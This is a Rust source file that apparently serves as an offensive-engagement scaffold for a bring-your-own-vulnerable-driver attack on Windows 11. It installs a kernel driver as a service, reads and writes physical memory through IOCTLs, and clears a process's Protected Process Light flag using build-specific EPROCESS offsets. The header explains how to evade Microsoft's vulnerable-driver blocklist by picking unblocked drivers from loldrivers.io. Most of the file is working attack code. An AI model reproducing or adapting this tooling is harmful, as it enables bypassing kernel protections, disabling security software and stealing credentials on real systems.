// ppldump.rs — Kernel write primitive (RTCore64 BYOVD replacement)
//
// WHY RTCore64 IS DEAD ON 2026 WIN11:
//   CVE-2019-16098 / RTCore64.sys is on Microsoft's HVCI vulnerable driver
//   blocklist since KB5012170 (Aug 2022). On any machine with Memory Integrity
//   (HVCI) enabled — default on all OEM Win11 24H2 installs and most enterprise
//   baselines — the driver will fail to load at the kernel level.
//
// THIS REPLACEMENT:
//   Driver-agnostic kernel write primitive scaffold. IOCTL codes and driver name
//   are left as named placeholders — update per-engagement after selecting a
//   current unblocked driver from loldrivers.io with kernel R/W capability.
//
//   Checklist for selecting a replacement driver:
//     1. loldrivers.io → filter: NOT on Microsoft blocklist, Has memory R/W
//     2. Reverse IOCTL interface (IDA/Ghidra) — find read/write handlers
//     3. Replace DRIVER_SERVICE_NAME, IOCTL_MEM_READ, IOCTL_MEM_WRITE below
//
//   EPROCESS.Protection offsets updated:
//     Win11 22H2/23H2 (22621/22631): 0x87A
//     Win11 24H2      (26100):       0x882

#![allow(non_snake_case, dead_code, unused_variables)]

use core::ffi::c_void;
use core::ptr::null_mut;

// ── REPLACEABLE per-engagement ────────────────────────────────────────────────
const DRIVER_SERVICE_NAME: &str = "WinRing0_1_2_0";   // update per driver
const IOCTL_MEM_READ:  u32 = 0xDEAD_BEEF;              // update per driver
const IOCTL_MEM_WRITE: u32 = 0xDEAD_C0DE;              // update per driver
// ─────────────────────────────────────────────────────────────────────────────

pub type CreateFileW = unsafe extern "system" fn(
    *const u16, u32, u32, *mut c_void, u32, u32, *mut c_void,
) -> *mut c_void;

pub type DeviceIoControl = unsafe extern "system" fn(
    *mut c_void, u32, *mut c_void, u32, *mut c_void, u32, *mut u32, *mut c_void,
) -> i32;

pub type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

pub type OpenSCManagerW     = unsafe extern "system" fn(*const u16, *const u16, u32) -> *mut c_void;
pub type OpenServiceW       = unsafe extern "system" fn(*mut c_void, *const u16, u32) -> *mut c_void;
pub type CreateServiceW     = unsafe extern "system" fn(
    *mut c_void, *const u16, *const u16, u32, u32, u32, u32,
    *const u16, *const u16, *mut u32, *const u16, *const u16, *const u16,
) -> *mut c_void;
pub type StartServiceW      = unsafe extern "system" fn(*mut c_void, u32, *const *const u16) -> i32;
pub type DeleteService      = unsafe extern "system" fn(*mut c_void) -> i32;
pub type CloseServiceHandle = unsafe extern "system" fn(*mut c_void) -> i32;

pub const PPL_NONE:    u8 = 0x00;
pub const PPL_WINTCB:  u8 = 0x72;

/// EPROCESS.Protection offset — verify per build:
///   Win11 22H2 (22621): 0x87A
///   Win11 23H2 (22631): 0x87A
///   Win11 24H2 (26100): 0x882
pub const EPROCESS_PROTECTION_OFFSET_24H2: u64 = 0x882;

pub struct KernelWriteCtx {
    pub h_device: *mut c_void,
    pub fn_ioctl: DeviceIoControl,
    pub fn_close: CloseHandle,
}

impl KernelWriteCtx {
    pub unsafe fn write_physical(&self, phys_addr: u64, val: u8) -> bool {
        #[repr(C)]
        struct WriteReq { address: u64, value: u8, _pad: [u8; 7] }
        let mut req = WriteReq { address: phys_addr, value: val, _pad: [0; 7] };
        let mut returned: u32 = 0;
        (self.fn_ioctl)(
            self.h_device, IOCTL_MEM_WRITE,
            &mut req as *mut WriteReq as *mut c_void,
            core::mem::size_of::<WriteReq>() as u32,
            null_mut(), 0, &mut returned, null_mut(),
        ) != 0
    }

    pub unsafe fn read_physical(&self, phys_addr: u64) -> Option<u8> {
        #[repr(C)]
        struct ReadReq { address: u64, _pad: [u8; 8] }
        let mut req = ReadReq { address: phys_addr, _pad: [0; 8] };
        let mut out: u8 = 0;
        let mut returned: u32 = 0;
        let ok = (self.fn_ioctl)(
            self.h_device, IOCTL_MEM_READ,
            &mut req as *mut ReadReq as *mut c_void,
            core::mem::size_of::<ReadReq>() as u32,
            &mut out as *mut u8 as *mut c_void,
            1, &mut returned, null_mut(),
        );
        if ok != 0 { Some(out) } else { None }
    }

    /// Clear PPL on target EPROCESS. `eprocess_phys` = physical addr of EPROCESS.
    pub unsafe fn clear_ppl(&self, eprocess_phys: u64, build_number: u32) -> bool {
        let offset = match build_number {
            26100        => EPROCESS_PROTECTION_OFFSET_24H2,
            22621 | 22631 => 0x87A,
            _             => 0x87A,
        };
        self.write_physical(eprocess_phys + offset, PPL_NONE)
    }

    pub unsafe fn close(self) {
        (self.fn_close)(self.h_device);
    }
}

pub unsafe fn load_driver_and_open(
    sys_path:    &str,
    device_path: &str,
    fn_scm:      OpenSCManagerW,
    fn_create:   CreateServiceW,
    fn_open_svc: OpenServiceW,
    fn_start:    StartServiceW,
    fn_open_dev: CreateFileW,
    fn_ioctl:    DeviceIoControl,
    fn_close:    CloseHandle,
) -> Option<KernelWriteCtx> {
    let wide_svc: Vec<u16>  = DRIVER_SERVICE_NAME.encode_utf16().chain(Some(0)).collect();
    let wide_sys: Vec<u16>  = sys_path.encode_utf16().chain(Some(0)).collect();
    let wide_dev: Vec<u16>  = device_path.encode_utf16().chain(Some(0)).collect();

    let h_scm = fn_scm(null_mut(), null_mut(), 0xF003F);
    if h_scm.is_null() { return None; }

    let h_svc = fn_create(
        h_scm, wide_svc.as_ptr(), wide_svc.as_ptr(),
        0xF01FF, 0x1, 0x3, 0x1, wide_sys.as_ptr(),
        null_mut(), null_mut(), null_mut(), null_mut(), null_mut(),
    );
    if h_svc.is_null() {
        let h_existing = fn_open_svc(h_scm, wide_svc.as_ptr(), 0xF01FF);
        if h_existing.is_null() { return None; }
    }
    fn_start(h_svc, 0, null_mut());

    let h_device = fn_open_dev(
        wide_dev.as_ptr(), 0xC0000000u32, 0, null_mut(), 0x3, 0, null_mut(),
    );
    if h_device as usize == usize::MAX { return None; }

    Some(KernelWriteCtx { h_device, fn_ioctl, fn_close })
}
